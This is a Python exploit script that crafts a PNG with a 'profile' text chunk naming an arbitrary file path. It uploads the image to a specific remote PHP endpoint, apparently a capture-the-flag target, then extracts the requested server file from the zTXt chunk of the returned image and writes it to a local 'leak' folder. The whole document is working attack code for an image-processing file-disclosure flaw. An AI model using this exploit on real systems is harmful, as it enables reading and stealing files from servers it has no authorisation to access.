import requests
import struct
import zlib
import sys
import io
import base64
import os

PNG_SIG = b"\x89PNG\r\n\x1a\n"

# from pypng
def write_chunk(outfile, tag, data=b''):
    data = bytes(data)
    outfile.write(struct.pack("!I", len(data)))
    outfile.write(tag)
    outfile.write(data)
    checksum = zlib.crc32(tag)
    checksum = zlib.crc32(data, checksum)
    checksum &= 0xffffffff
    outfile.write(struct.pack("!I", checksum))

def write_chunks(out, chunks):
    """Create a PNG file by writing out the chunks."""

    out.write(PNG_SIG)
    for chunk in chunks:
        write_chunk(out, *chunk)

def chunks(infile):
    sig = infile.read(8)
    assert sig == PNG_SIG
    while 1:
        chunk = infile.read(8)
        if not chunk:
            return
        length, type = struct.unpack("!I4s", chunk)
        data = infile.read(length)
        assert len(data) == length
        checksum = infile.read(4)
        assert len(checksum) == 4
        yield (type, data)

def make_cve_png(filename):
    chunks = [
        (b"IHDR", bytes.fromhex("00 00 00 01 00 00 00 01 01 00 00 00 00")),
        (b"IDAT", bytes.fromhex("08 D7 63 68 00 00 00 82 00 81")),
        (b"tEXt", b"profile\0" + filename.encode("utf8") + b"\0"),
        (b"IEND", b""),
    ]
    f = io.BytesIO()
    write_chunks(f, chunks)
    return f.getvalue()

filename = sys.argv[1]
png = make_cve_png(filename)
r = requests.post("https://nft.quatre-qu.art/nft-library.php", data=dict(filedata=base64.b64encode(png)))
r.raise_for_status()
for ctype, cdata in chunks(io.BytesIO(r.content)):
    if ctype == b"zTXt" and cdata.startswith(b"Raw profile type"):
        data = zlib.decompress(cdata.split(b"\0\0", 1)[1])
        clean_filename = os.path.abspath(os.path.join("/1/2/3", filename))
        os.makedirs("leak/" + os.path.dirname(clean_filename), exist_ok=True)
        with open("leak/" + clean_filename, "wb") as outf:
            outf.write(bytes.fromhex(data.split(None, 1)[1].decode()))
        break
    print(ctype, cdata)
else:
    print("Error: no zTXt found!")
